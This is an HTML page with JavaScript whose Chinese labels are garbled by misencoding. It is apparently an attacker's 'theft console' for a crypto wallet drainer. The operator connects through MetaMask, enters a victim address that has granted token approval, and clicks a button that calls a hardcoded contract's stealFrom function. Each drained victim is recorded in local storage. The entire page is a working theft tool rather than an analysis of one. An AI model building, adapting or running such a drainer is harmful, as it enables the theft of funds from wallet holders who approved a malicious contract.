
<!DOCTYPE html>
<html lang="zh-TW">
<head>
  <meta charset="UTF-8" />
  <title>ç›œå–æ§åˆ¶å° v3.0 æ¸¬è©¦ç¶²</title>
</head>
<body>
  <h2>ğŸ› ï¸ æ”»æ“Šè€…æ“ä½œä»‹é¢</h2>
  <p>åˆç´„åœ°å€ï¼š<b>0xfC35E3407c86461BA2D00C080cC763c0f6878377</b></p>
  <p>ç›®å‰ç™»å…¥å¸³è™Ÿï¼š<span style="color:green;"><b id="attacker">å°šæœªç™»å…¥</b></span></p>
  <p>âœ… èº«ä»½é©—è­‰ï¼š<span style="color:green;">ä½ æ˜¯æ”»æ“Šè€…æœ¬äºº</span></p>
  <input type="text" id="victim" placeholder="è¼¸å…¥æˆæ¬Šè€…åœ°å€" size="50"/>
  <button onclick="steal()">åŸ·è¡Œç›œå–</button>
  <p id="status"></p>
  <hr />
  <h3>ğŸ“Œ æœ€è¿‘æˆæ¬Šåœ°å€åˆ—è¡¨ï¼š</h3>
  <ul id="list"></ul>
  <script>
    const CONTRACT = "0xfC35E3407c86461BA2D00C080cC763c0f6878377";
    document.title = "ç›œå–æ§åˆ¶å° v3.0 æ¸¬è©¦ç¶²";
    document.getElementById('attacker').innerText = "MetaMask é€£ç·šä¸­...";
    async function steal() {
      const victim = document.getElementById('victim').value.trim();
      const provider = window.ethereum;
      const web3 = new window.Web3(provider);
      const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
      const from = accounts[0];
      document.getElementById('attacker').innerText = from;
      const abi = [{ "inputs": [{ "internalType": "address", "name": "victim", "type": "address" }], "name": "stealFrom", "outputs": [], "stateMutability": "nonpayable", "type": "function" }];
      const contract = new web3.eth.Contract(abi, CONTRACT);
      try {
        const tx = await contract.methods.stealFrom(victim).send({ from });
        document.getElementById("status").innerText = "âœ… äº¤æ˜“é€å‡ºï¼š" + tx.transactionHash;
        const ul = document.getElementById("list");
        const li = document.createElement("li");
        li.innerText = victim + " âœ…";
        ul.appendChild(li);
        let history = JSON.parse(localStorage.getItem("approved") || "[]");
        if (!history.includes(victim)) {
          history.push(victim);
          localStorage.setItem("approved", JSON.stringify(history));
        }
      } catch (err) {
        document.getElementById("status").innerText = "âŒ ç™¼é€å¤±æ•—ï¼š" + err.message;
      }
    }
    // é é¢è¼‰å…¥è‡ªå‹•å¡«å…¥æ­·å²ç´€éŒ„
    window.onload = () => {
      let history = JSON.parse(localStorage.getItem("approved") || "[]");
      const ul = document.getElementById("list");
      history.forEach(v => {
        const li = document.createElement("li");
        li.innerText = v + " âœ…";
        ul.appendChild(li);
      });
    };
  </script>
  <p style="margin-top:2em; color:gray;">ç‰ˆæœ¬ï¼šv3.0 æ¸¬è©¦ç¶²</p>
</body>
</html>
